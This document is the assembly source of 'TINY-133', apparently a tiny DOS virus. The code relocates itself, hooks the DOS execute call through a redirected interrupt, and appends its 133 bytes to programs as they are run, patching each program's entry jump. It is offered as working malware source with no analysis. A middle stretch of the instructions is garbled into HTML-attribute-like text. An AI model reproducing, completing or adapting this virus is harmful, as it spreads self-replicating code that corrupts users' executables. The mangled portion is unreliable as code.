

;NAME: TINY-133 SOURCE
;

;.MODEL TINY
;.CODE
CODE    SEGMENT BYTE PUBLIC 'CODE'
ASSUME  CS:CODE,DS:CODE,ES:NOTHING,SS:NOTHING

P00100  PROC
        ORG     0100h

H00100:
        DEC     BP                                  ;00100 4D            M
      ;  JMP     SHORT H00107                         ;00101 E90400        ___
        DB      0E9H, 04h

        DB      000H
;---------------------------------------------------
        INT     20h             ;B-TERM_norm:20h    ;00104 CD20          _
;---------------------------------------------------
H00106: NOP                                  ;00106 90            _
H00107: NOP                                         ;00107 90            _
H00108: MOV	SI,0100h			    ;00108 BE0001	 ___
	MOV	BX,062Fh			    ;0010B BB2F06	 _/_
	MOV	CX,0050h			    ;0010E B95000	 _P_
	MOV	DI,SI				    ;00111 8BFE 	 __
	ADD	SI,[SI+02h]			    ;00113 037402	 _t_
	PUSH	DI				    ;00116 57		 W
	MOVSW					    ;00117 A5		 _
	MOVSW					    ;00118 A5		 _
	MOV	ES,CX		;ES_Chg 	    ;00119 8EC1 	 __
	CMPSB					    ;0011B A6		 _
	JZ	H00130				    ;0011C 7412 	 t_
	DEC	SI				    ;0011E 4E		 N
	DEC	DI				    ;0011F 4F		 O
	REPZ	MOVSW				    ;00120 F3A5 	 __
	MOV	ES,CX		;ES_Chg 	    ;00122 8EC1 	 __
	XCHG	AX,BX				    ;00124 93		 _
	XCHG	AX,CX				    ;00125 91		 _
H00126: XCHG	AX,CX				    ;00126 91		 _
	XCHG	AX,ES:[DI+0FEE0h]
				;ES_Ovrd	    ;00127 268785E0FE	 &____
	STOSW					    ;0012C AB		 _
	JCXZ	H00126				    ;0012D E3F7 	 __
	XCHG	AX,BX				    ;0012F 93		 _
H00130: PUSH	DS				    ;00130 1E		 _
	POP	ES				    ;00131 07		 _
	RET			;RET_Near	    ;00132 C3		 _
;---------------------------------------------------
	CMP	AX,4B00h			    ;00133 3D004B	 =_K
	JNZ	H00174				    ;00136 753C 	 u< push="" ax="" ;00138="" 50="" p="" push="" bx="" ;00139="" 53="" s="" push="" dx="" ;0013a="" 52="" r="" push="" ds="" ;0013b="" 1e="" _="" push="" es="" ;0013c="" 06="" _="" mov="" ax,3d02h="" ;0013d="" b8023d="" __="CALL" h0017c="" ;="" .="" .="" .="" .="" .="" .="" .="" .="" .="" ;00140="" e83900="" _9_="" jb="" h0016f="" ;00143="" 722a="" r*="" cbw="" ;00145="" 98="" _="" cwd="" ;00146="" 99="" _="" mov="" bx,si="" ;00147="" 8bde="" __="" mov="" ds,ax="" ;ds_chg="" ;00149="" 8ed8="" __="" mov="" es,ax="" ;es_chg="" ;0014b="" 8ec0="" __="" mov="" ah,3fh="" ;0014d="" b43f="" _?="" int="" 69h="" ;indef_int:69h-3fh="" ;0014f="" cd69="" _i="" mov="" al,4dh="" ;00151="" b04d="" _m="" scasb="" ;00153="" ae="" _="" jz="" h0016b="" ;00154="" 7415="" t_="" mov="" al,02h="" ;00156="" b002="" __="" call="" h00179="" ;="" .="" .="" .="" .="" .="" .="" .="" .="" .="" ;00158="" e81e00="" ___="" mov="" cl,85h="" ;0015b="" b185="" __="" int="" 69h="" ;indef_int:69h-3fh="" ;0015d="" cd69="" _i="" mov="" ax,0e94dh="" ;0015f="" b84de9="" _m_="" stosw="" ;00162="" ab="" _="" xchg="" ax,si="" ;00163="" 96="" _="" stosw="" ;00164="" ab="" _="" xchg="" ax,dx="" ;00165="" 92="" _="" call="" h00179="" ;="" .="" .="" .="" .="" .="" .="" .="" .="" .="" ;00166="" e81000="" ___="" int="" 69h="" ;indef_int:69h-ah="" ;00169="" cd69="" _i="" h0016b:="" mov="" ah,3eh="" ;0016b="" b43e="" _="">
	INT	69h		;Indef_INT:69h-3Eh  ;0016D CD69 	 _i
H0016F: POP	ES				    ;0016F 07		 _
	POP	DS				    ;00170 1F		 _
	POP	DX				    ;00171 5A		 Z
	POP	BX				    ;00172 5B		 [
	POP	AX				    ;00173 58		 X
H00174:
;        JMP     CS:[01A4h]
        DB      2EH, 0FFh, 2Eh, 0A4h, 01H

				;Mem_Brch:CS:[01A4h];00174 2EFF2EA401	 ._.__
;---------------------------------------------------
H00179: MOV	AH,42h				    ;00179 B442 	 _B
	CWD					    ;0017B 99		 _
H0017C: XOR	CX,CX				    ;0017C 33C9 	 3_
	INT	69h		;Indef_INT:69h-00h  ;0017E CD69 	 _i
	MOV	CL,04h				    ;00180 B104 	 __
	XCHG	AX,SI				    ;00182 96		 _
	MOV	AX,4060h			    ;00183 B86040	 _`@
	XOR	DI,DI				    ;00186 33FF 	 3_
	RET			;RET_Near	    ;00188 C3		 _
;---------------------------------------------------

P00100  ENDP

CODE   ENDS
        END     H00100
 
;-------------------------------------------------------------------------------
 

